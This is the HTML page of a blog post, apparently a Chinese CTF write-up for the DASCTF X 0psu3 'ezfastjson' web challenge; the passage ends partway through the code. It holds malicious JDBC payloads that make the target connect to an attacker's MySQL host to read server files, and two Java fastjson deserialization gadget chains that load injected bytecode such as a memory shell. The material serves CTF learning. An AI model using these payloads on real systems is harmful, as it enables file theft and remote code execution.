@@ -1,0 +1,1394 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DASCTF X 0psu3 十一月挑战赛-web 复现前言感觉每次DASCTF的web题都巨难，始终还是自己太菜了 ezfastjson没环境，看WP 访问服务可以看到mysql连接测试。可以猜测后台是用jdbc进行连接测试的。 搭建恶意的mysql服务器。后台是把host和port这些拼接的，那其实只提交host也可以了，再用#符号把后面的脏数据闭合掉。 这里可以使用jdbc的一些参数连接恶意">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF X Opsu3十一月挑战赛">
+<meta property="og:url" content="https://zer0peach.github.io/2024/01/15/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="DASCTF X 0psu3 十一月挑战赛-web 复现前言感觉每次DASCTF的web题都巨难，始终还是自己太菜了 ezfastjson没环境，看WP 访问服务可以看到mysql连接测试。可以猜测后台是用jdbc进行连接测试的。 搭建恶意的mysql服务器。后台是把host和port这些拼接的，那其实只提交host也可以了，再用#符号把后面的脏数据闭合掉。 这里可以使用jdbc的一些参数连接恶意">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240115221604694.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240115222310560.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116183051616.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116182837104.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116183330740.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116185030215.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116185607037.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116192204079.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240116192255238.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240117225646208.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118000210914.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118000338853.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118001157576.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118001731562.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118002154318.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240118002357048.png">
+<meta property="article:published_time" content="2024-01-15T14:01:15.000Z">
+<meta property="article:modified_time" content="2024-01-17T16:28:12.369Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240115221604694.png">
+  
+  
+  
+  <title>DASCTF X Opsu3十一月挑战赛 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DASCTF X Opsu3十一月挑战赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-15 22:01" pubdate>
+          2024年1月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          79k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          661 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DASCTF X Opsu3十一月挑战赛</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DASCTF-X-0psu3-十一月挑战赛-web-复现"><a href="#DASCTF-X-0psu3-十一月挑战赛-web-复现" class="headerlink" title="DASCTF X 0psu3 十一月挑战赛-web 复现"></a>DASCTF X 0psu3 十一月挑战赛-web 复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉每次DASCTF的web题都巨难，始终还是自己太菜了</p>
+<h2 id="ezfastjson"><a href="#ezfastjson" class="headerlink" title="ezfastjson"></a>ezfastjson</h2><p>没环境，看WP</p>
+<p>访问服务可以看到mysql连接测试。可以猜测后台是用jdbc进行连接测试的。</p>
+<p>搭建恶意的mysql服务器。后台是把host和port这些拼接的，那其实只提交host也可以了，再用#符号把后面的脏数据闭合掉。</p>
+<p>这里可以使用jdbc的一些参数连接恶意mysql服务器进行任意文件读取</p>
+<p><code>allowUrlInLocalInfile</code>属性的判断，如果为<code>true</code>，那么就会使用URL类来加载我们提供的路径</p>
+<p>列出根目录文件</p>
+<div class="code-wrapper"><pre><code class="hljs Plain">&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125;</code></pre></div>
+
+<p>读取jar包</p>
+<div class="code-wrapper"><pre><code class="hljs Plain">&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///app/ezfastjson-0.0.1-SNAPSHOT.jar&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125;</code></pre></div>
+
+
+
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240115221604694.png" srcset="/img/loading.gif" lazyload alt="image-20240115221604694"></p>
+<p>出题人逻辑顺序有误，这里的waf是先进行了fastjson解析后，才进行危险字符检测的。我都rce了。你检测到了又怎么样。</p>
+<p>直接打一个1.2.43版本的jndi注入就行了</p>
+<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>因为waf太硬了，基本没有绕过手段，所以利用fastjson的话肯定是用fastjson的反序列化链子</p>
+<p><img src="/../images/DASCTF-X-Opsu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/image-20240115222310560.png" srcset="/img/loading.gif" lazyload alt="image-20240115222310560"></p>
+<p>现在的我看的话直接就是Neepuctf的那条链（AbstractAction），直接秒了</p>
+<p>直接给出官方WP  （他这一看就是带jar包使用agent的，呜呜呜我没有）</p>
+<div class="code-wrapper"><pre><code class="hljs java"> <span class="hljs-keyword">package</span> com.example.testfang;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;
+<span class="hljs-keyword">import</span> com.example.no.MyObjectInputStream;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;
+<span class="hljs-keyword">import</span> javassist.ClassPool;
+<span class="hljs-keyword">import</span> javax.swing.*;
+<span class="hljs-keyword">import</span> javax.swing.event.SwingPropertyChangeSupport;
+<span class="hljs-keyword">import</span> javax.swing.text.StyledEditorKit;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.util.ArrayList;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solve</span> &#123;
+
+
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;
+
+
+        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
+        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>,
+                <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(MemShell.class.getName()).toBytecode()&#125;
+        );
+        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);
+        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());
+
+
+        <span class="hljs-type">ArrayList</span> <span class="hljs-variable">arrayList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();
+        arrayList.add(templates);
+        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);
+
+        <span class="hljs-type">XString</span> <span class="hljs-variable">xstr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;&quot;</span>);
+
+        StyledEditorKit.<span class="hljs-type">AlignmentAction</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> Reflections.createWithoutConstructor(StyledEditorKit.AlignmentAction.class);
+        setFieldValue(action, <span class="hljs-string">&quot;changeSupport&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingPropertyChangeSupport</span>(<span class="hljs-string">&quot;&quot;</span>));
+
+        action.putValue(<span class="hljs-string">&quot;r1&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);
+        action.putValue(<span class="hljs-string">&quot;r2&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);
+        <span class="hljs-type">Field</span> <span class="hljs-variable">tablefield</span> <span class="hljs-operator">=</span> AbstractAction.class.getDeclaredField(<span class="hljs-string">&quot;arrayTable&quot;</span>);
+        tablefield.setAccessible(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">Object</span> <span class="hljs-variable">atable</span> <span class="hljs-operator">=</span> tablefield.get(action);
+        <span class="hljs-type">Field</span> <span class="hljs-variable">tablefield1</span> <span class="hljs-operator">=</span> atable.getClass().getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);
+        tablefield1.setAccessible(<span class="hljs-literal">true</span>);
+        Object[] table1 = (Object[])tablefield1.get(atable);
+        table1[<span class="hljs-number">1</span>] = xstr;
+        table1[<span class="hljs-number">3</span>] = toStringBean;
+        tablefield1.set(atable, table1);
+
+
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr1);
+        oos1.writeObject(action);
+
+
+
+        table1[<span class="hljs-number">1</span>] = xstr;
+        table1[<span class="hljs-number">3</span>] = toStringBean;
+        tablefield1.set(atable, table1);
+
+
+        System.out.println(serial(action));
+        deserial(serial(action));
+
+
+
+
+
+    &#125;
+
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">try</span> &#123;
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+        &#125;
+        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;
+            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)
+                field = getField(clazz.getSuperclass(), fieldName);
+        &#125;
+        <span class="hljs-keyword">return</span> field;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+        <span class="hljs-keyword">return</span> base64String;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);
+        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(bais);
+        ois.readObject();
+        ois.close();
+    &#125;
+&#125;
+</code></pre></div>
+
+<p>内存马就不贴了，看官方WP</p>
+<h4 id="其实这里还能使用另一个链子"><a href="#其实这里还能使用另一个链子" class="headerlink" title="其实这里还能使用另一个链子"></a>其实这里还能使用另一个链子</h4><p><code>EventListenerList</code>，这个还是lolita在<code>MiniL ctf</code>向出题人学的</p>
+<p>这个在之前Neepuctf那个也想用，但是那个禁用了java.util，其中使用到的一个类被检测到了，就没办法</p>
+<p>这里看着应该没问题</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;
+
+<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;
+<span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;
+<span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;
+<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
+<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;
+
+<span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;
+<span class="hljs-keyword">import</span> javax.swing.event.SwingPropertyChangeSupport;
+<span class="hljs-keyword">import</span> javax.swing.text.StyledEditorKit;
+<span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;
+<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
+<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
+<span class="hljs-keyword">import</span> java.net.URI;
+<span class="hljs-keyword">import</span> java.nio.file.Files;
+<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="hljs-keyword">import</span> java.security.*;
+<span class="hljs-keyword">import</span> java.sql.SQLOutput;
+<span class="hljs-keyword">import</span> java.util.Base64;
+<span class="hljs-keyword">import</span> java.util.Vector;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+
+        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();
+
+        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>));
+<span class="hljs-comment">//        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class&quot;));</span>
+<span class="hljs-comment">//        byte[] bytecodes = Repository.lookupClass(Cmdclass.class).getBytes();</span>
+        setValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);
+        setValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;bytecodes&#125;);
+        setValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());
+
+
+        <span class="hljs-type">ArrayList</span> <span class="hljs-variable">arrayList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();
+        arrayList.add(templatesimpl);
+        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);
+
+        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();
+        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();
+        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);
+        vector.add(jsonNodes);
+        setValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);
+
+        deserial((serial(list)));
+
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">try</span> &#123;
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;
+            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)
+                field = getField(clazz.getSuperclass(), fieldName);
+        &#125;
+        <span class="hljs-keyword">return</span> field;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);
+        <span class="hljs-keyword">return</span> field.get(obj);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+        oos.writeObject(o);
+        oos.close();
+
